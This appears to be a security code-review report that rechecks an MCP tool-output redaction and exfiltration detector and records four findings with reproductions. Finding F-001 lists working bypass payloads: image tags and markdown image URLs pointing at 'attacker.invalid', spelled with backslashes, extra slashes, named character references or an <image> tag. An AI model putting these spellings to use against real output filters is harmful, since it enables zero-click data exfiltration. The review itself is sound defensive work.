STATUS: DONE_WITH_CONCERNS

# T24 recheck 2 — independent verification of the second-approach structural-output fix

Second recheck round. This reviewer wrote none of the code, none of the tests, and neither earlier
review. Every verdict below cites a probe this reviewer wrote and executed against the current
working tree, not an earlier author's artifact. The four pre-existing probes were re-run as controls
and reproduce their reported verdicts; they are under-powered by construction, because their fixtures
are exactly the vectors the two earlier rounds named.

## Scope

- Branch: `codex/agent-first-core`
- Base / merge-base: `main` @ `0bc6418fa1a038f8ec909cf949fecba077acf9a4`
- Scope mode: the dispatch's `files_to_read` plus `src/security/guard.ts` (the persistence
  materializer reached by the serialized adapter). Excluded per dispatch and owned by a concurrent
  reviewer: `src/security/config.ts`, `src/security/path-scan.ts`, the `scan`/`runGate` region of
  `src/security/service.ts`.
- Stage 1: **FAIL** — row 4 (auto-fetch classification) is not met; rows 1, 2, 3, 5 and 6 are met.
- Stage 2 (code quality): **stopped**, as required when Stage 1 does not pass.
- Source changes made by this review: **none** (read-only). One mutation experiment ran inside a
  throwaway `rsync` copy under the session scratchpad; the real checkout was never edited.

File SHA-256 recorded at start and again at end. **No reviewed file changed during the review**, and
the three files owned by the concurrent reviewer show no drift either.

| File | SHA-256 (start = end) |
|---|---|
| `src/security/output-validation.ts` | `236d845da91370d56f686f6b312db19ddcfdd8e78c73b356f5823c4f047d7d00` |
| `src/security/output-validation.test.ts` | `a4ff136c191d62345870d5d87f5efc9317dfac2e686898323f09ab686b91dd10` |
| `src/security/detect/exfil.ts` | `4f8ec40f7590b35ad28cd88f7e6fe8ef138127304eefc44d05d5bdd57496196b` |
| `src/security/detect/exfil.test.ts` | `1612152dc584271ec2385686726f1393c27450d808489f009111cc44b1beb3fb` |
| `src/security/detect/secrets.ts` | `b2ba4128f65e58d262542bcb99316c3de9045018fe629b6bb5f0d997872886ce` |
| `src/security/schemas.ts` | `8c1455c2f29105c3134f5f2c3df6c6cf6517933d21e5f259b56a72e86fbd919e` |
| `src/security/service.ts` | `f8bde8514cac4c4aa1c1ea55f2257fe73cc2387a6ed81995313ff0699fee378f` |
| `src/mcp/redact-seam.ts` | `b60306db6d7e5c66f0e7bc04a79ade8f720dc44f6cc60af96b70a4bd3b92966b` |
| `src/mcp/dispatch.ts` | `f1db21b0872c7bb46b4ac09819f9676ed0fd1609652f8caf978640497b6f6f18` |
| `src/security/persistence-sinks.test.ts` | `bfdccd5d7583535d2388a55ee0d37daeb537e4d52ce45554de4120c7a0a63d34` |
| `src/mcp/structural-redaction.test.ts` | `53faabb2d160271a372718294b161fc65482c2b0fe3d6f976b2d740849ca6aca` |
| `src/security/guard.ts` | `eb8275b198811be98d03d88ea13d8d1fd6be156e83344d11fbd06f56873138db` |
| `src/security/config.ts` (concurrent owner) | `713e880cdc643edceaed5f85c70ef5311e310e9953f8a55401df9b20e3f00294` |
| `src/security/path-scan.ts` (concurrent owner) | `94f82ce5a5c33857aef52df6f2c1a124880553901354cb25451b1298d4fd3cc8` |

Start/end snapshots: `.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/.T24R2-hashes-start.txt`
and `.T24R2-hashes-end.txt`; `diff` between them is empty.

## Summary

- Blocker: 1
- Major: 1
- Minor: 1
- Info: 1

Three of the four original blockers are now genuinely closed, at the pure validator **and** at the
real MCP transport and persistence materializer, with every approved-contract control intact. The
second approach to F-002 is sound: I could not construct any payload whose original bytes are
returned while carrying content the structural walk did not see. F-004 is still open — the new
decoder closes the axes the first recheck enumerated and misses five further renderer-equivalent
classes, 17 of which I demonstrated reaching the MCP client with `isError:false` and
`redaction.state:"none"`. The new canonical-re-serialization rule also alters a numeric value's
meaning in one case and mislabels a class of untouched payloads as `redacted`.

## Stage 1 — specification compliance

| # | Row | Verdict | Evidence |
|---|---|---|---|
| 1 | Secret/PII span in an enumerable property name fails closed with the fixed reason, key never renamed, at the validator and the real MCP transport | **MET** | `T24-recheck2-validator.ts → f001`: seven shapes — top-level, nested under an array, doubly nested, an e-mail key, a URL-credential key, an `<img>`-bearing key, and a key that carries the span only after JSON unescaping — all return `ok:false`, `reasons:["sensitive-property-name"]`, `text === "Output withheld: format-unsafe"`. `keyNeverRenamed`: the failed result carries **no** `value` property and contains no `REDACTED` marker anywhere, so the key is never rewritten. Controls hold: `{user_id_12345, buildNumber7}`, `{"1234567890","17251234567"}`, a path key, an env-var key and a public-URL key are byte-preserved with `state:"none"`; `{"password":"hunter"}` → `redacted`/`secrets.sensitive-field`; `{"password":123456789}` → `sensitive-numeric-field`. Transport (`T24-recheck2-boundary.ts → mcp`): `p.secret-key`, `p.deep-secret-key`, `p.email-key` all `isError:true`, `state:"format-unsafe"`, `reasons:["sensitive-property-name"]`, constant text, secret absent from the whole serialized result — with `redactToolOutput:false`, i.e. advisory redaction off. |
| 2 | Duplicate serialized members can no longer restore hidden bytes, in every enumerated shape; the changed contract satisfies `policies.md`; canonical re-serialization cannot be turned into a hiding channel | **MET** (with the caveats in F-002/F-003 below) | `T24-recheck2-validator.ts → f002`: the five shapes the first recheck named (`plain`, JSON-escaped, fully escaped, and empty/`null`/`false` survivors) plus nine further shapes I added (nested, inside an array, object/array survivors, three-way duplicate, escape-spelled duplicate **key**, whitespace-padded duplicate, depth-4 duplicate) all return `ok:true`, `state:"redacted"`, `reasons:["serialized-content-normalized"]`, `bytesRestored:false`, no leak. Shapes whose *structure* is unsafe still fail closed: `{"password":"…","password":1}` → `sensitive-numeric-field`; `{"<AWS key>":"x","<AWS key>":"y"}` → `sensitive-property-name`. Boundary (`→ persistence`, `→ seam`): eight duplicate shapes return `allowed:true` with `bytesIdenticalToInput:false` and no credential; `secretPropertyName` and `numericUnderCredentialKey` are refused. **Contract judgement:** returning the safe canonical form with `state:"redacted"` is what `policies.md` §Redaction line 20 requires — the safe part preserves the operation schema, so it must be returned, and `format-unsafe` is reserved for a structure with no safe representation. The current code satisfies that: `format-unsafe` is now reachable only from the walk. **Attack on canonicalisation:** hiding a dropped member requires `withoutInsignificantWhitespace(content) === JSON.stringify(validatedValue)`; the only bytes removed are the four JSON inter-token whitespace characters, which carry no content, so a dropped member is always extra tokens and always breaks the comparison. I could construct no counter-example in 14 duplicate shapes. I *did* construct meaning-altering canonicalisation (F-002) and meaning-preserving but mislabelled canonicalisation (F-003). |
| 3 | Local `$ref` with an unsupported validation sibling fails closed with the fixed reason; bare ref, ref + `$defs`, annotation siblings still pass; unresolvable ref keeps its own reason with no attacker text | **MET** | `T24-recheck2-validator.ts → f003`: ten sibling shapes — `minLength`, `type`, `pattern`, `enum`, `format`, `required`, and the same shape nested under `properties`, under `items`, inside a `$defs` entry, and under `additionalProperties` — all return `schema.unsupported-reference-siblings`. Bare `$ref` passes (`"ok"` → `state:"none"`; `123` → `schema.validation-failed`); `$ref` + `$schema`/`$id`/`title` passes; unresolvable, foreign and attacker-named refs keep `schema.unsupported-reference`, and an attacker string embedded in the ref name leaks nowhere in the whole result (`leaks:false`). Transport: `p.ref-sibling` `isError:true` with the token and constant text; `p.ref-defs-sibling` and `p.ref-annotations` `isError:false`, `state:"none"`; `p.ref-unresolvable` keeps `schema.unsupported-reference`. |
| 4 | Character references and `srcset` candidates classified as a renderer would; ordinary public link untouched | **NOT MET** | `T24-recheck2-exfil.ts`, 48 cases, each carrying a WHATWG-URL oracle (`new URL(decoded, "https://client.example.org/…")`) so "a renderer fetches this" is measured. All 20 previously-fixed vectors stay closed and all 4 benign controls stay unflagged (**0** false positives). **17 cases are bypasses**: the renderer resolves `attacker.invalid` and the detector leaves the host in the output. Five classes: backslash authority spellings (6), extra slashes after the scheme (3), the HTML5 named references `&Tab;`/`&NewLine;` (4), the `<image>` start tag (2), and a markdown pointy-bracket destination containing a tab or leading space (2). Reproduced at the real transport: `p.backslash-protocol-relative`, `p.backslash-scheme`, `p.triple-slash`, `p.named-tab-image`, `p.named-newline-image`, `p.image-tag`, `p.srcset-backslash`, `p.markdown-angle-tab` all return `isError:false`, `state:"none"`, `reasons:[]`, attacker host present — and the same three shapes are `allowed:true` **byte-identical** through `prepareOutputForPersistence` and `redactToolOutput`. See finding T24R2#F-001. |
| 5 | No new false rejection: public documentation URL beside an e-mail note accepted as redacted; pretty-printed canonical payload byte-preserved with no redaction state; repository-JSON rejection count re-measured | **MET** | `f002.urlThenEmailAcrossMembers` → `ok:true`, `state:"redacted"`, `reasons:["pii.email"]`, text `{"docs":"https://example.com","note":"[REDACTED:email]"}` — **byte-identical** to the same value validated directly as a parsed object (`serialized===parsed` is `true`). The sibling shapes `repoThenOwner`, `linkThenContact`, `emailThenUrl` also pass. Byte preservation: compact clean JSON, and the same value pretty-printed at indent 2, indent 4 and tab, are all `bytesRestored:true` with `state:"none"`; non-JSON prose is unchanged. **Re-measured, not trusted:** my own sweep over **2041** repository JSON files (the earlier sweeps used 401/409) reports **0 rejections**, 0 `serialized-content-mismatch`, 1969 byte-preserved. The "5 before" figure is not independently verifiable without reconstructing retired code, so I verify only the "0 after". The sweep surfaced a new outcome the earlier rounds could not have measured: 22 files are byte-rewritten and labelled `redacted` while containing nothing sensitive (F-003). At the transport, `p.public-link` is `state:"none"` and byte-identical; `p.public-link-plus-email` is accepted as `redacted`/`pii.email`, not refused. |
| 6 | The nine newly committed regressions genuinely pin the behaviour they claim | **MET for 8 of 9** | `T24-recheck2-mutations.ts` — seven **single-line** inverses of the *current* code applied one at a time in a throwaway copy, so nothing here rests on a reconstruction. Baseline in the copy: 31 pass / 0 fail. M1 (delete the `isSensitivePropertyName` screen) → exactly the property-name MCP test fails. M2 (delete the `REFERENCE_SAFE_SIBLINGS` check) → exactly the `$ref`-sibling MCP test fails. M3 (drop `decodeCharacterReferences` from `renderableUrl`) and M4 (disable the `srcset` loop) → each independently fails the entity/`srcset` MCP test, so that test pins both halves. M5 (make byte preservation unconditional again, i.e. the literal pre-fix rule) → **exactly the five duplicate-member persistence tests fail and nothing else**. The ninth test — "materializer keeps a metric string beside a long digit run allowed and redacted" — fails under **no** mutation in this class; it is a control that near-duplicates the pre-existing test at `src/security/persistence-sinks.test.ts:27`, not a regression pin (T24R2#F-004). M6/M7 additionally show the zero-padding and URL-whitespace defects are pinned — but by `src/security/detect/exfil.test.ts`, not by the T32 transport tests, which stay green under both. **On the disclosed reconstruction:** T32's `output-validation.ts` revert was a reconstruction because the file is untracked, and it over-rejected the metric/digit-run case. My M5 is the literal inverse of the shipped rule rather than a reconstruction, and it confirms T32's conclusion for the five duplicate-member tests while showing their tenth failure was indeed a reconstruction artifact. `exfil.ts`'s revert was a genuine `git show HEAD` checkout, as they stated. |

### Dispatch acceptance criteria

- **AC2 (AFC-02)** — **met**. The synthetic secret is absent from tool JSON, from a thrown error and
  from the sibling metadata (`p.secret-key`, `p.throws-secret`, `JSON.stringify(result)` checks);
  safe JSON passes its schema (`p.safe-scalars`, `p.ref-defs-sibling`); a numeric required field
  carrying a secret returns `format-unsafe`/`sensitive-numeric-field` rather than an invalid string
  (`p.password-numeric`, and `persistence.numericUnderCredentialKey` refused).
- **AC5 (AFC-15)** — **partial**. No field-name bypass survives at either boundary; a URL secret is
  masked (`p.entity-image`, `p.srcset-image`, `requiredAllowedAndRedacted` →
  `{"metric":"[REDACTED:secret]","count":123456789}` with the 9-digit count intact); an ordinary
  public Markdown link is byte-identical and not a finding, alone and beside a redacted sibling. It
  fails on auto-fetch: 17 renderer-equivalent URLs still reach the client unflagged (T24R2#F-001).
- **Third criterion** — **not met**: three of four original blockers are closed by evidence executed
  here; the fourth (F-004) has a live class at the public boundary.

## Findings

### [T24R2#F-001] The new URL classifier still misses five classes of renderer-equivalent auto-fetch URL

- **Severity:** blocker
- **File:** `src/security/detect/exfil.ts:144`
- **Symbol:** `exfilHost` / `NAMED_CHARACTER_REFERENCES` / `HTML_IMG` / `INLINE`
- **Attack vector:** Attacker-controlled tool, resource or error text emits an `<img>` (or markdown
  image) whose destination a renderer resolves to `attacker.invalid` but whose raw spelling
  `exfilHost` does not recognise as having a host. Five independent spellings, all measured against a
  conformant WHATWG URL parser:
  1. **Backslash authority.** `<img src="\\attacker.invalid/p?x=ctx">`. The URL parser's *relative
     slash* / *special authority ignore slashes* states treat `\` exactly as `/` for special schemes,
     so this is protocol-relative and resolves to `attacker.invalid` from any base. `exfilHost`
     matches only `^https?://` and `^//`. Same for `https:\\host`, `https:/\host`, `/\host`, the
     entity-written `&#92;&#92;host`, and a `srcset` candidate spelled the same way.
  2. **Extra slashes.** `https:///host`, `https:////host`, `///host` — the parser skips an unbounded
     run of `/` and `\` after the scheme; the detector's `([^/?#]+)` capture requires the byte right
     after `//` to be a non-slash, so it matches nothing.
  3. **Named references outside this file's table.** `<img src="ht&Tab;tps://attacker.invalid/p">`
     and the `&NewLine;` variant. Both are in the HTML5 named character reference table; the decoded
     U+0009/U+000A is then *removed* by the URL parser, exactly like the `&#9;` form the fix already
     closes. `NAMED_CHARACTER_REFERENCES` has 26 entries and neither of these.
  4. **`<image>`.** `<img\b` does not match `<image`, but the HTML parser rewrites an `image` start
     tag to `img` ("in body": change the token's tag name to `img` and reprocess), so
     `<image src="https://attacker.invalid/p">` renders and fetches identically.
  5. **Markdown pointy-bracket destination.** `![x](<ht<TAB>tps://attacker.invalid/p>)` and the
     leading-space variant. `renderableUrl`'s tab/LF/CR stripping never sees them because the
     extraction regexes (`INLINE`'s `[^)\s>]+`, `REFERENCE_DEF`'s `[^\s>]+`, and `srcset`'s
     `candidate.trim().split(/\s+/)[0]`) truncate the destination at the first whitespace, *before*
     the classification funnel.
- **Problem:** T24R#F-002's class scope asserted that "every auto-fetch parser routes through
  `considerUrl`, so one classifier fix covers all five surfaces". That is true for the decoding axis
  and false for two others: (a) `exfilHost` still recognises only two literal authority spellings out
  of the several the WHATWG URL parser accepts, so no amount of decoding helps; (b) the whitespace
  stripping added to `considerUrl` is unreachable for three of the five surfaces because their
  extraction regexes drop the whitespace-bearing remainder first. The fix again closed the enumerated
  axes rather than the grammar.
- **Impact:** The mandatory no-auto-fetch floor is bypassed for the same class T24 F-004 and
  T24R#F-002 recorded. The payload reaches the MCP client inside operation JSON with `isError:false`
  and `redaction.state:"none"` — the metadata affirmatively states nothing was redacted — and reaches
  durable sinks byte-identical through `prepareOutputForPersistence`. Rendering it is a zero-click
  request to the attacker host carrying whatever context the attacker encoded in the query string.
  Advisory security being disabled is irrelevant; the probe ran with `redactToolOutput:false`.
- **Reproduction:**
  `bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T24-recheck2-exfil.ts <out>`
  → `bypasses` lists 17 ids (`new.namedTabInScheme`, `new.namedNewlineInScheme`,
  `new.namedTabAfterScheme`, `new.leadingNamedTab`, `new.backslashProtocolRelative`,
  `new.backslashSchemeBoth`, `new.backslashSchemeMixed`, `new.slashBackslashRelative`,
  `new.backslashEntity`, `new.srcsetBackslash`, `new.tripleSlash`, `new.fourSlash`,
  `new.threeSlashRelative`, `new.imageTag`, `new.imageTagEntity`, `new.markdownAngleTab`,
  `new.markdownAngleLeadingSpace`), each with `rendererHost:"attacker.invalid"`, `flagged:false`,
  `hostStillPresentAfterRedaction:true`, and `falsePositives: []`.
  `bun …/T24-recheck2-boundary.ts <out>` → `mcp.p.backslash-protocol-relative`,
  `.p.backslash-scheme`, `.p.triple-slash`, `.p.named-tab-image`, `.p.named-newline-image`,
  `.p.image-tag`, `.p.srcset-backslash`, `.p.markdown-angle-tab` = `isError:false`, `state:"none"`,
  `leaksHost:true`; `persistence.backslashImage`, `.namedTabImage`, `.imageTag` =
  `allowed:true, bytesIdenticalToInput:true, leaksHost:true`; `seam.*` identical to input.
  Measurement note: the host resolution is measured with Bun's WHATWG `URL`; the
  `<image>`→`img` rewrite and the CommonMark pointy-bracket destination grammar are taken from the
  respective standards, not from a live renderer.
- **Suggested fix:** Stop pattern-matching the authority. In `considerUrl`, resolve the decoded,
  whitespace-stripped candidate with the platform `URL` parser against a synthetic same-origin base
  and treat any resulting origin that differs from that base as external — that covers backslashes,
  extra slashes and every future spelling in one rule, with `start`/`end` still on the raw span.
  Separately: extend the extraction regexes so the whitespace-bearing remainder reaches
  `considerUrl` (markdown `<…>` destinations at minimum), match `<image>` alongside `<img>`, and
  either import the HTML5 named-reference table for the characters the URL parser removes or add
  `Tab`/`NewLine` to `NAMED_CHARACTER_REFERENCES`. Add one regression per class in
  `src/security/detect/exfil.test.ts` and one at the transport in
  `src/mcp/structural-redaction.test.ts`, keeping the four benign controls.
  Not probed and worth a scoping decision, not a claim: `<input type="image" src>`,
  `<source srcset>` inside `<picture>`, `<iframe>`, `<video poster>`, `<object data>` and
  `<embed src>` are auto-fetching surfaces with no matcher at all here.
- **Class scope:**
  - sites: `src/security/detect/exfil.ts:144` (`exfilHost` — the authority recogniser),
    `:34` (`NAMED_CHARACTER_REFERENCES`), `:135` (`renderableUrl`), `:164` (`considerUrl`),
    `:192` (`INLINE`), `:196` (`REFERENCE_DEF`), `:198` (`HTML_IMG`), `:201` (`HTML_IMG_SRCSET`),
    `:289` (the `srcset` candidate split).
  - enumeration_method: complete read of `src/security/detect/exfil.ts`, then a 48-case matrix
    generated by crossing the two independent axes the code exposes — the character-reference
    grammar (decimal/hex/named × case × optional semicolon × zero padding × double encoding) and the
    URL-syntax the WHATWG parser accepts or removes (tab/LF/CR, leading C0-or-space, backslash-for-
    slash, unbounded slash runs, userinfo) — against every extraction surface (`INLINE`,
    `REFERENCE_DEF`, `HTML_IMG`, `HTML_IMG_SRCSET`, `<image>`), each paired with a benign control
    and adjudicated by a WHATWG `URL` oracle rather than by inspection.

### [T24R2#F-002] Canonical re-serialization silently alters an out-of-double-range integer, and the persistence materializer strips the only signal

- **Severity:** major
- **File:** `src/security/output-validation.ts:563`
- **Symbol:** `validateSerializedContentForTransport` / `bytesAreCanonicalFor`
- **Trigger:** Serialized JSON carrying an integer literal that is not exactly representable as an
  IEEE-754 double — a Twitter/Discord snowflake, a GitHub numeric node id, an epoch in nanoseconds,
  an int64 primary key. `JSON.parse` rounds it; the walk finds nothing sensitive; the bytes are not
  canonically equivalent to the rounded structure, so the **rounded** canonical serialization is
  returned in place of the original bytes.
- **Problem:** The rule's stated guarantee is "content is preserved, only its spelling is
  normalized". That holds for `1e3`, `1.0` and escape spelling, but not for a numeric literal outside
  double range, where re-serialization is lossy. Before this change the `state:"none"` branch returned
  the original bytes, so the literal survived; now it is rewritten.
- **Impact:** Integrity, not confidentiality. A durable sink writes a corrupted identifier.
  `prepareOutputForPersistence` returns only `{allowed, content}` and drops `redaction` entirely, so
  every persistence caller (`src/memory/write.ts`, `src/wiki/service.ts`, `src/wiki/enrich.ts`,
  `src/sac/wiki-owner-writer.ts`, `src/sac/session-wrap-up.ts`, `src/gdskills/project-skills.ts`,
  `src/metrics/lifecycle.ts`) receives the altered value with **no** signal at all. At the MCP
  transport the caller at least sees `state:"redacted"` — but the reason token
  `serialized-content-normalized` says "spelling", not "value changed".
- **Reproduction:** `bun …/T24-recheck2-validator.ts <out>` → `f002.bigIntegerPrecision`:
  in `{"n":12345678901234567890}` → out `{"n":12345678901234567000}`, `ok:true`,
  `state:"redacted"`, `reasons:["serialized-content-normalized"]`. `f002.negativeZero`:
  `{"n":-0}` → `{"n":0}`. (`exponentSpelling`, `trailingZeroDecimal`, `escapeSpelling`,
  `solidusEscape`, `integerLikeKeyOrder`, `unicodeKeyOrder` also normalize but are value-preserving.)
- **Suggested fix:** Before substituting the canonical form, compare the *token stream* rather than
  only the final string: when the sole difference is a numeric literal whose re-serialization
  differs, that is data loss, not normalization. Either keep the original bytes for that case (the
  walk has already proven the structure safe, and a whitespace/number-literal-only difference hides
  no member), or return `format-unsafe` with a distinct fixed token so the loss is not silent. At
  minimum, propagate `redaction` through `prepareOutputForPersistence` so a persistence caller can
  see that its bytes were rewritten.
- **Class scope:**
  - sites: `src/security/output-validation.ts:563` (the substitution),
    `src/security/output-validation.ts:534` (`bytesAreCanonicalFor`),
    `src/security/service.ts:47` (`validateSerializedOutput`), `src/security/guard.ts:59`
    (`prepareOutputForPersistence`, which discards the state), `src/mcp/redact-seam.ts:31`, and the
    durable sinks `src/memory/write.ts`, `src/wiki/service.ts`, `src/wiki/enrich.ts`,
    `src/sac/wiki-owner-writer.ts`, `src/sac/session-wrap-up.ts`,
    `src/gdskills/project-skills.ts`, `src/metrics/lifecycle.ts`.
  - enumeration_method: `bun src/cli.ts ctx rg "validateSerializedOutput|validateSerializedContentForTransport|prepareOutputForPersistence" src`
    enumerates the single adapter, its two wrappers and every durable-sink consumer (the same set the
    first recheck enumerated, re-run against the current tree); the *input* class was enumerated by
    replaying every way `JSON.stringify(JSON.parse(x))` can differ from `x` outside whitespace —
    number literal spelling, number literal precision, `-0`, string escape spelling, and object key
    ordering — as a 9-case matrix, of which precision and `-0` are the only value-altering members.

### [T24R2#F-003] A safe payload that spells non-ASCII with `\u` escapes is rewritten and reported as `redacted`

- **Severity:** minor
- **File:** `src/security/output-validation.ts:566`
- **Symbol:** `SERIALIZED_NORMALIZED_REASON`
- **Trigger:** Any serialized JSON whose strings spell a non-ASCII character as `\uXXXX`, or whose
  numbers are spelled `1.0`. Producers that do this by default include Python's
  `json.dumps` (`ensure_ascii=True`) and Go's `encoding/json` (which escapes `<`, `>`, `&` as
  `\u003c`, `\u003e`, `\u0026`) — i.e. a large share of third-party MCP servers.
- **Problem:** Nothing sensitive is present and nothing is redacted, but the result carries
  `state:"redacted"` with `serialized-content-normalized` and rewritten bytes. The T19 contract's
  "byte-for-byte preservation of safe scalars" holds for pretty-printing but not for escape spelling,
  and `T36-implementation.md`'s "401/401 real repository JSON files pass" reads as byte preservation
  when it in fact measured the absence of *rejections*.
- **Impact:** No disclosure and no rejection. Two second-order effects: a caller that branches on
  `redaction.state` (a warning banner, an audit counter, a "was anything removed" check) is told a
  redaction occurred when none did; and durable artifacts are silently reformatted on every write
  through the guard, which perturbs diffs and content hashes.
- **Reproduction:** `bun …/T24-recheck2-repojson.ts <out> /Users/Goodea/goodea/keryx` →
  `{"filesScanned":2041,"bytePreserved":1969,"rejected":0,"normalizedOnly":22,...}`. The 22 are
  `.metaproject/core/gdskills/contracts/*.schema.json`,
  `src/gdskills/bundled/skills/**/​*-contract.schema.json`, `fixtures/change-impacted-test/expected.json`
  and several flow artifacts; the divergences are an em-dash/curly-quote written as `\u2014` /
  `\u2019`, and `"coveragePrecision":1.0`. In every case the parsed value is unchanged
  (`canonicalInput === output` for all sampled files).
- **Suggested fix:** Split the reason, or the state. Either keep `state:"none"` when the difference
  is confined to escape spelling and value-preserving number spelling and reserve `"redacted"` for
  an actual content change, or introduce a third, non-redaction reason (e.g.
  `serialized-content-reserialized`) so a caller can distinguish "we removed something" from "we
  reprinted it". Amend the T36 note that currently reads as a byte-preservation claim.
- **Class scope:**
  - sites: `src/security/output-validation.ts:491` (`SERIALIZED_NORMALIZED_REASON`), `:563` (the
    branch that assigns it), `src/security/output-validation.test.ts:` the pretty-printed
    byte-preservation regression (which passes and does not cover this shape).
  - enumeration_method: exhaustive sweep of all 2041 `.json` files in the checkout (excluding
    `node_modules`, `.git`, build output) through the real adapter, classifying each into
    byte-preserved / rejected / normalized-only / redacted-for-content, then diffing
    `withoutInsignificantWhitespace(content)` against `JSON.stringify(JSON.parse(content))` on the
    22 normalized files to identify the exact divergence.

### [T24R2#F-004] The ninth committed regression pins no defect in the class it was added for

- **Severity:** info
- **File:** `src/security/persistence-sinks.test.ts:108`
- **Symbol:** `"materializer keeps a metric string beside a long digit run allowed and redacted"`
- **Problem:** T32 added this test as part of the nine boundary regressions, and reported that it
  failed under their scratch revert — while also disclosing that failure as a reconstruction
  artifact. My seven single-line mutations confirm the disclosure: the test fails under **none** of
  them, including M5, which is the literal inverse of the byte-preservation rule the other five
  persistence tests pin. Its payload takes the `state:"redacted"` early-return branch, so the byte
  preservation rule never runs on it. It also near-duplicates the pre-existing test at
  `src/security/persistence-sinks.test.ts:27`, which makes the same three assertions.
- **Impact:** None on correctness — it is a valid AC5 control (no false rejection, 9-digit count
  preserved) and it passes. The record should simply not count it as one of the nine closures, or the
  next round will believe a defect is pinned that is not.
- **Suggested fix:** Keep the test, relabel it in the flow record as an acceptance control rather than
  a regression, and note that the T24R#F-002 zero-padding/whitespace defects are pinned by
  `src/security/detect/exfil.test.ts` only — the T32 transport tests stay green under both M6 and M7.
- **Reproduction:** `bun …/T24-recheck2-mutations.ts all <out>` from the scratch copy; M5 →
  `pass=26 fail=5`, all five failures being the `DUPLICATE_MEMBER_SHAPES` table; M6 → `fail=2`, both
  in `exfil.test.ts`; M7 → `fail=1`, in `exfil.test.ts`.

## Confirmed clean areas

Each was executed, not inspected.

- **Constant failure text.** Every rejection in every probe returns exactly
  `Output withheld: format-unsafe`, at the validator and at `dispatchCallTool`.
- **Fixed reason tokens only.** The complete observed set across 130+ cases:
  `sensitive-property-name`, `sensitive-numeric-field`, `non-json-value`, `cyclic-value`,
  `serialized-content-normalized`, `schema.unsupported-reference-siblings`,
  `schema.unsupported-reference`, `schema.validation-failed`, `secrets.sensitive-field`,
  `secrets.aws-access-key`, `pii.email`, `egress.html-image-exfil`. No value, length or fingerprint
  appears in any of them. An attacker-chosen `$ref` name leaks nothing across the whole result.
- **`serialized-content-mismatch` is fully retired** — it appears in no probe result and in 0 of 2041
  repository files.
- **Byte preservation of safe data.** Compact and pretty-printed (indent 2, indent 4, tab) clean JSON,
  top-level JSON scalars, `{}`, `[]` and non-JSON prose are all returned byte-identical with
  `state:"none"`; 1969 of 2041 real repository JSON files are byte-preserved.
- **T19 contract points.** Own `undefined` member → `non-json-value`; a cycle → `cyclic-value`; a
  non-finite number → `non-json-value`; a numeric value under a sensitive credential key →
  `sensitive-numeric-field` at the validator, the transport and the materializer; ordinary public
  Markdown links and bare public URLs are not egress findings, alone or beside a redacted sibling.
- **Structurally unsafe duplicates still fail closed.** A duplicate whose surviving value is a number
  under a credential key, and a duplicate secret *key*, both reach `format-unsafe` rather than being
  normalized into acceptance.
- **Error and unknown-tool paths.** A thrown tool error carrying a credential returns
  `isError:true`, `state:"redacted"`, credential absent from the whole result; an unknown tool name
  returns a constant message with `state:"none"`.
- **The floor applies with advisory redaction disabled.** Every transport case ran with
  `mergeMcpConfig({ redactToolOutput: false })`.
- **Concurrent-area drift.** `src/security/guard.ts`, `src/security/config.ts` and
  `src/security/path-scan.ts` are byte-identical at start and end of this review.
- **Focused suites green.** `bun test src/security/output-validation.test.ts
  src/security/detect/exfil.test.ts src/mcp/structural-redaction.test.ts
  src/security/persistence-sinks.test.ts` → 58 pass, 0 fail, 273 assertions.
- **The four pre-existing probes reproduce.** `T24-stage1-probe.ts` reports all four findings closed;
  `T24-recheck-f002-class.ts` reports `hidesSecret:false` for all nine shapes and 0/409 repository
  rejections; `T24-recheck-validator.ts` leaves only `srcsetProtocolLess` unflagged, which is correct
  (a bare relative path resolves same-origin); `T24-recheck-boundary.ts` reports
  `paddedEntityImage.leaksHost:false` and `leadingSpaceImage.leaksHost:false`.

## Evidence

| Artifact | SHA-256 |
|---|---|
| `T24-recheck2-exfil.ts` | `cf003cd3de078f9c399c7f7105c521f0eacab47f0eaa52b5cfe0afeab21b99be` |
| `T24-recheck2-validator.ts` | `2a96ce74aca4c64c461c7edd729ddfae3e789f38d60fda34c652f12430f6bdff` |
| `T24-recheck2-boundary.ts` | `7fa37ea14c8be163b8ad7a3ebd8ddd569bcc722059775e9835ab829dd5b0b264` |
| `T24-recheck2-repojson.ts` | `e316c0531278c8b32634e8edce20d6540ee748eb29005ef81da83b8cd515e3b2` |
| `T24-recheck2-mutations.ts` | `0e1bc6d6f50f10da056b0025c749fd75f7f12bb9208289059f0cd105b887e059` |
| raw: exfil matrix `.metaproject/data/gdctx/raw/2026-09-06T14-16-23-620Z_run.log` | `2ac537123f791a36b7252580a29710929252cb3839081f01e0871599bc61c6ed` |
| raw: validator `.metaproject/data/gdctx/raw/2026-09-06T14-18-12-601Z_run.log` | `f7df5b6a55216acf5ddcb05de2b7cdc6f5d333b02509440d5729104cb0059783` |
| raw: repo JSON sweep `.metaproject/data/gdctx/raw/2026-09-06T14-19-15-778Z_run.log` | `03f5f549d4a1119dcae8ff891e81101085b95adfe9ce9d3c09d9b7a959caeded` |
| raw: boundary `.metaproject/data/gdctx/raw/2026-09-06T14-20-51-242Z_run.log` | `a33f41c5dc6ed7398a302bd1e64de08f00622361666f942186cd5b8d1ad6edcc` |
| raw: focused suites `.metaproject/data/gdctx/raw/2026-09-06T14-22-43-548Z_run.log` | `f43059eb10099ed3b1853c09541d3fa721c56e9ddea166174ec508a282561569` |
| raw: control probes `.metaproject/data/gdctx/raw/2026-09-06T14-23-52-413Z_run.log` | `39dfc410a317eec4dca7aa6900db0d9a152f413289db20681950b41ef1942c9b` |
| mutation report (scratchpad, session-local) | `1c6a5debc2155e5752c330fed7d4b025da7c6a979e2fd0a299d4bb63a5f75ac8` |

Probe JSON outputs are under the session scratchpad
(`…/scratchpad/T24-recheck2-{exfil,validator,boundary,repojson}.json`); every probe is deterministic
and re-runnable from the committed `.ts` files above.

No model call, no network, no dependency change, no git or flow-state change, no global `bun test`,
and no mutation of any file in the checkout occurred. All credentials in probes are synthetic
(`AKIA`+`IOSFODNN7EXAMPLE`, `tr0ub4dor-correct-horse`) and all hosts are reserved
(`attacker.invalid`, `example.com`, `example.org`, `host.example`).

## Routing audit

- `graph_used: no (not-relevant)` — the dispatch enumerated the file set exactly, and
  `keryx gdgraph` answers from the last build while the tree carries a large uncommitted multi-worker
  change set, so a graph answer could not be quoted as current. The one enumeration that needed a
  cross-file set (the durable sinks) was taken from `ctx rg` over the current tree.
- `wiki_used: no (not-relevant)` — the governing texts are
  `docs/requirements/keryx-agent-first-core/policies.md`, the flow's `acceptance-criteria.md` and the
